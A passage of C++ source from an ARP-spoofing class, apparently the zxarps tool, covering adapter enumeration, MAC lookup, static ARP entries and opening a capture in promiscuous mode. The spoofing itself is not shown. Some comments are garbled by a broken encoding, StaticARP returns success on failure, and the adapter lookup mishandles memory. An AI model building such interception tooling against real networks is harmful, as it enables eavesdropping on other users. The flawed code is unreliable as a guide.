	if (SendARP(dwIP, (IPAddr) NULL,(PULONG) mac, &macAddLen) == NO_ERROR)
	{
		return TRUE;
	}
	else
	{
		addr.S_un.S_addr = dwIP;
        //printf("-> Error Get Mac Address of %s\r\n",inet_ntoa(addr));
		return FALSE;
	}
}

bool CARPSpoof::GetMacByIP(char *szIP, unsigned char *mac)
{
	return GetMacByIP(inet_addr(szIP), mac);
}
//
// ��̬��ARP����������ARP��
//
bool CARPSpoof::StaticARP(char szIPAddr[], BYTE bPhysAddr[])
{
	MIB_IPFORWARDROW ipfrow;
	MIB_IPNETROW iprow;
	DWORD dwIPAddr = inet_addr((char *) szIPAddr);
	if (GetBestRoute(dwIPAddr,ADDR_ANY, &ipfrow) != NO_ERROR)
		return false;
	memset(&iprow, 0, sizeof(iprow));
	iprow.dwIndex = ipfrow.dwForwardIfIndex;
	iprow.dwPhysAddrLen = 6;
	memcpy(iprow.bPhysAddr, bPhysAddr, 6);
	iprow.dwAddr = dwIPAddr;
	iprow.dwType = 4;	/* - static */

	if (CreateIpNetEntry(&iprow) != NO_ERROR)
		return true;
	return false;
}

int CARPSpoof::GetAdapterList()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE], szGateIPAddr[16], *p;
	char szIPAddr[16];
	unsigned char ucPhysicalAddr[6];
	BYTE bmac[6];

    if (PCAPAPI::pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        zxarps_printf("Error in pcap_findalldevs: %s\r\n", errbuf);
        return 0;
    }
    for (d=alldevs; d; d=d->next)
    {
        if (d->addresses != NULL && (p = strchr(d->name, '{')) != NULL
			&& GetAdapterByName(p, szIPAddr, ucPhysicalAddr,szGateIPAddr))
		{
			if (d->description[15] == 0x20)
				d->description[15] = '\0';

			zxarps_printf("\r\n%d. %s\r\n\tIP Address. . . . . : %s\r\n", i, d->description, szIPAddr);
			
			zxarps_printf("\tPhysical Address. . : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\r\n", 
				ucPhysicalAddr[0], ucPhysicalAddr[1], ucPhysicalAddr[2],
				ucPhysicalAddr[3], ucPhysicalAddr[4], ucPhysicalAddr[5]
				);

			zxarps_printf("\tDefault Gateway . . : %s\r\n", szGateIPAddr);

			GetMacByIP(szGateIPAddr, bmac);//ͨ��IP���MAC

			zxarps_printf("\tPhysical Address. . : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\r\n", 
				bmac[0], bmac[1], bmac[2],
				bmac[3], bmac[4], bmac[5]
				);


			i ++;
		}

    }  
    if (i==0)
    {
        zxarps_printf("\r\nNo interfaces found! Make sure WinPcap is installed.\r\n");
        return 0;
    }

    PCAPAPI::pcap_freealldevs(alldevs);

	return i;
}

bool CARPSpoof::GetAdapterByName(char szAdapterName[], char szIPAddr[],
					  unsigned char ucPhysicalAddr[],  char szGateIPAddr[])
{
	PIP_ADAPTER_INFO pInfo = NULL,pInfoTemp = NULL;
	ULONG ulSize = 0;
	GetAdaptersInfo(pInfo,&ulSize); // First call get buff size
	pInfo = (PIP_ADAPTER_INFO) new(char[ulSize]);
	GetAdaptersInfo(pInfo, &ulSize);
	while(pInfo)
	{
		if (strcmp(szAdapterName, pInfo->AdapterName) ==0)
		{
			
			for(int i=0; i < (int)pInfo->AddressLength; i++)
				ucPhysicalAddr[i] = pInfo->Address[i];
			// Get Last Ip Address To szIPAddr
			PIP_ADDR_STRING pAddTemp=&(pInfo->IpAddressList);
			while(pAddTemp)
			{
				strcpy(szIPAddr,pAddTemp->IpAddress.String);
				pAddTemp=pAddTemp->Next;
			}
			if (strlen(pInfo->GatewayList.IpAddress.String) > 0)
				strcpy(szGateIPAddr, pInfo->GatewayList.IpAddress.String);
			else
				strcpy(szGateIPAddr, "N/A"); // Not Applicable
			return TRUE;
		}
		pInfo = pInfo->Next; 
	}
	delete [] pInfo;
	return FALSE;
}

bool CARPSpoof::OpenAdapterByIndex(int idx)
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	pcap_t *fp = NULL;
    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE], *p;
    /* ���API��������������б� */
    if (PCAPAPI::pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        zxarps_printf("Error in pcap_findalldevs: %s\r\n", errbuf);
        return false;
    }
    /* ��ʾ�б����Ӧ�ֶε����� */
    for (d=alldevs; d; d=d->next)
    {        
		if (d->addresses != NULL 
			&& (p = strchr(d->name, '{')) != NULL
			&& GetAdapterByName(p, m_Me.szIP, m_Me.s_mac.mac, m_Gateway.szIP)//˳���ø�������IP����mac��������IP
			)
		{	
			if (i == idx)
			{
				if ((fp = PCAPAPI::pcap_open_live(d->name, // device 
					65536,     // portion of the packet to capture.
					// 65536 grants that the whole packet will be captured on all the MACs.
					1,       // promiscuous mode 
					1, //a value of 0 means no time out
					errbuf     // error buffer
					)) == NULL)
				{
					zxarps_printf("\r\nUnable to open the adapter. \
						%s is not supported by WinPcap\r\n", d->name);
					PCAPAPI::pcap_freealldevs(alldevs);
					return false;
				}
				else
				{
					if (d->description[15] == 0x20) // ����һЩ��������ַ���
						d->description[15] = '\0';

					m_adhandle = fp;

					m_Me.dwIP = inet_addr(m_Me.szIP);

					zxarps_printf("[*] Bind on %s %s...\r\n", m_Me.szIP, d->description);

					return true;
				}
			}
			i ++;
		}
    }
    if (i==0)
    {
        zxarps_printf("\r\nNo interfaces found! Make sure WinPcap is installed.\r\n");
        return false;
    }
    /* We don't need any more the device list. Free it */
    PCAPAPI::pcap_freealldevs(alldevs);
	return false;
}
